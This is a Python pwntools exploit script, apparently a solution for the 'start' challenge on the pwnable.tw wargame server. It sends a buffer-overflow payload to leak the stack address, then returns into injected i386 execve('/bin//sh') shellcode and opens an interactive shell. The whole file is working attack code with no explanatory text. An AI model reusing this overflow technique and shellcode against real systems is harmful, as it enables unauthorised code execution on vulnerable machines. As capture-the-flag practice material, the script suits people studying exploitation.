from pwn import *

context(os="linux",arch="i386")

def main():
	# conn = process('./start')
	conn = remote('chall.pwnable.tw',10000)

	mov_ecx_esp = "\x87\x80\x04\x08"
	shellcode = "\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

	payload = ''
	payload += "A" * 20
	payload += mov_ecx_esp

	print conn.recv(100)
	conn.send(payload)

	get_stack = conn.recv(100)

	esp = ''

	for i in range(4):
		esp += get_stack[i]

	# print esp
	print hex(u32(esp))

	payload = ''
	payload += "A"*20
	payload += esp
	payload += shellcode

	# print payload

	# print conn.recv(100)
	conn.send(payload)

	conn.interactive()

if __name__ == "__main__":
	main()